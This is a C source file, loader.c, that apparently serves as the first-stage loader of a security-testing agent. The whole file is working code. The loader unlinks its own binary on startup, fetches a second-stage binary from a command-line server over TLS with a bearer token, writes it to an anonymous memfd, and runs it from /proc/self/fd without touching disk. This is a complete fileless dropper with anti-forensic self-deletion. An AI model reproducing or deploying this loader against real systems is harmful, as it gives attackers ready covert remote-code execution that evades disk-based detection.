#define _GNU_SOURCE
/*
 * Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

 /*
  * loader.c – Stage 1 OAST agent loader (C/musl/mbedTLS)
  *
  * Usage: loader <server-url> <token> <agent-id>
  *
  * Downloads Stage 2 agent from <server-url>/dl/second-stage/linux-ARCH,
  * loads it into an anonymous in-memory file (memfd_create + MFD_CLOEXEC),
  * and exec(2)s from /proc/self/fd/N — Stage 2 never touches disk.
  * Self-deletes (unlink argv[0]) immediately on startup (one-shot).
  *
  * Build: see Dockerfile / Dockerfile.arm64 for the canonical Docker build
  *        (minimal mbedTLS: ECDHE-ECDSA-AES128-GCM-SHA256, no RSA).
  */

#include <mbedtls/ctr_drbg.h>
#include <mbedtls/entropy.h>
#include <mbedtls/net_sockets.h>
#include <mbedtls/ssl.h>
#include <mbedtls/x509_crt.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#if defined(__x86_64__)
#  define ARCH "amd64"
#elif defined(__aarch64__)
#  define ARCH "arm64"
#else
#  error "unsupported architecture"
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static int xmemfd_create(const char* name, unsigned int flags) {
#if defined(SYS_memfd_create)
    return (int)syscall(SYS_memfd_create, name, flags);
#elif defined(__NR_memfd_create)
    return (int)syscall(__NR_memfd_create, name, flags);
#else
    errno = ENOSYS;
    (void)name;
    (void)flags;
    return -1;
#endif
}

#define BODY_BUF 65536

static void die(const char* msg) {
    char nl = '\n';
    write(STDERR_FILENO, msg, strlen(msg));
    write(STDERR_FILENO, &nl, 1);
    _exit(1);
}

/* Try CA bundle paths in order; return 0 on first success. */
static int load_ca(mbedtls_x509_crt* ca) {
    static const char* files[] = {
        "/etc/ssl/certs/ca-certificates.crt",   /* Debian/Ubuntu/Alpine */
        "/etc/pki/tls/certs/ca-bundle.crt",     /* RHEL/CentOS/Fedora */
        "/etc/ssl/ca-bundle.pem",               /* OpenSUSE */
        "/etc/ssl/cert.pem",                    /* macOS/FreeBSD */
        NULL,
    };
    for (int i = 0; files[i]; i++) {
        /* mbedtls_x509_crt_parse_file returns 0 (all ok), >0 (partial), <0 (failure) */
        if (mbedtls_x509_crt_parse_file(ca, files[i]) >= 0)
            return 0;
    }
    /* Fall back to directory scan */
    if (mbedtls_x509_crt_parse_path(ca, "/etc/ssl/certs/") >= 0)
        return 0;
    return -1;
}

int main(int argc, char* argv[]) {
    /* Self-delete immediately — the loader is one-shot */
    unlink(argv[0]);

    if (argc != 4)
        die("usage: loader <url> <token> <agent_id>");

    const char* server_url = argv[1];
    const char* token = argv[2];
    const char* agent_id = argv[3];

    /* ---- Build download URL ---- */
    char dl_url[2048];
    int n = snprintf(dl_url, sizeof(dl_url),
        "%s/dl/second-stage/linux-" ARCH, server_url);
    if (n < 0 || n >= (int)sizeof(dl_url))
        die("URL too long");

    /* ---- Parse https://host[:port]/path ---- */
    if (strncmp(dl_url, "https://", 8) != 0)
        die("URL must start with https://");

    char* rest = dl_url + 8;
    char* slash = strchr(rest, '/');
    char* path = slash ? slash : "/";

    char hostport[256];
    if (slash) {
        size_t hp_len = (size_t)(slash - rest);
        if (hp_len >= sizeof(hostport)) die("host too long");
        memcpy(hostport, rest, hp_len);
        hostport[hp_len] = '\0';
    } else {
        size_t hp_len = strlen(rest);
        if (hp_len >= sizeof(hostport)) die("host too long");
        memcpy(hostport, rest, hp_len);
        hostport[hp_len] = '\0';
    }

    char hostname[256];
    char port[8] = "443";
    char* colon = strchr(hostport, ':');
    if (colon) {
        size_t hl = (size_t)(colon - hostport);
        memcpy(hostname, hostport, hl);
        hostname[hl] = '\0';
        strncpy(port, colon + 1, sizeof(port) - 1);
        port[sizeof(port) - 1] = '\0';
    } else {
        strncpy(hostname, hostport, sizeof(hostname) - 1);
        hostname[sizeof(hostname) - 1] = '\0';
    }

    /* ---- Build HTTP/1.1 request ---- */
    char request[4096];
    n = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Authorization: Bearer %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, hostport, token);
    if (n < 0 || n >= (int)sizeof(request))
        die("request too large");

    /* ---- mbedTLS setup ---- */
    mbedtls_net_context      net;
    mbedtls_ssl_context      ssl;
    mbedtls_ssl_config       conf;
    mbedtls_x509_crt         cacert;
    mbedtls_entropy_context  entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    int ret;

    mbedtls_net_init(&net);
    mbedtls_ssl_init(&ssl);
    mbedtls_ssl_config_init(&conf);
    mbedtls_x509_crt_init(&cacert);
    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    ret = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func,
        &entropy, NULL, 0);
    if (ret) die("rng seed failed");

    if (load_ca(&cacert) != 0) die("no CA bundle found");

    ret = mbedtls_net_connect(&net, hostname, port, MBEDTLS_NET_PROTO_TCP);
    if (ret) die("connect failed");

    ret = mbedtls_ssl_config_defaults(&conf,
        MBEDTLS_SSL_IS_CLIENT,
        MBEDTLS_SSL_TRANSPORT_STREAM,
        MBEDTLS_SSL_PRESET_DEFAULT);
    if (ret) die("ssl config failed");

    mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_REQUIRED);
    mbedtls_ssl_conf_ca_chain(&conf, &cacert, NULL);
    mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &ctr_drbg);

    ret = mbedtls_ssl_setup(&ssl, &conf);
    if (ret) die("ssl setup failed");

    ret = mbedtls_ssl_set_hostname(&ssl, hostname);
    if (ret) die("ssl set_hostname failed");

    mbedtls_ssl_set_bio(&ssl, &net,
        mbedtls_net_send, mbedtls_net_recv, NULL);

    /* TLS handshake */
    do {
        ret = mbedtls_ssl_handshake(&ssl);
    } while (ret == MBEDTLS_ERR_SSL_WANT_READ ||
        ret == MBEDTLS_ERR_SSL_WANT_WRITE);
    if (ret) die("tls handshake failed");

    /* Send HTTP request */
    size_t sent = 0, req_len = strlen(request);
    while (sent < req_len) {
        ret = mbedtls_ssl_write(&ssl,
            (unsigned char*)request + sent,
            req_len - sent);
        if (ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
        if (ret < 0) die("ssl write failed");
        sent += (size_t)ret;
    }

    /* ---- Read response headers byte by byte until \r\n\r\n ---- */
    unsigned char hdr[8192];
    int hlen = 0, found = 0;
    while (hlen < (int)sizeof(hdr) - 1) {
        ret = mbedtls_ssl_read(&ssl, hdr + hlen, 1);
        if (ret == MBEDTLS_ERR_SSL_WANT_READ) continue;
        if (ret <= 0) break;
        hlen++;
        if (hlen >= 4 &&
            hdr[hlen - 4] == '\r' && hdr[hlen - 3] == '\n' &&
            hdr[hlen - 2] == '\r' && hdr[hlen - 1] == '\n') {
            found = 1;
            break;
        }
    }
    if (!found) die("malformed HTTP response");

    /* Check HTTP 200 status */
    hdr[hlen] = '\0';
    char* sp = memchr(hdr, ' ', hlen < 16 ? (size_t)hlen : 16);
    if (!sp || strncmp(sp + 1, "200", 3) != 0)
        die("download failed: non-200 response");

    /* ---- Stream body into anonymous in-memory file ---- */
    int memfd = xmemfd_create("", MFD_CLOEXEC);
    if (memfd < 0) die("memfd_create failed");

    unsigned char body[BODY_BUF];
    for (;;) {
        ret = mbedtls_ssl_read(&ssl, body, sizeof(body));
        if (ret == MBEDTLS_ERR_SSL_WANT_READ) continue;
        if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
        if (ret < 0) {
            close(memfd);
            die("ssl read failed");
        }
        unsigned char* p = body;
        int rem = ret;
        while (rem > 0) {
            ssize_t w = write(memfd, p, (size_t)rem);
            if (w < 0) { close(memfd); die("write failed"); }
            p += w;
            rem -= (int)w;
        }
    }

    mbedtls_ssl_close_notify(&ssl);

    /* Exec Stage 2 agent directly from memory */
    char fdpath[32];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", memfd);

    char* exec_argv[] = {
        fdpath,
        "-url",   (char*)server_url,
        "-token", (char*)token,
        "-id",    (char*)agent_id,
        NULL
    };
    execv(fdpath, exec_argv);
    die("execv failed");
    return 1;
}
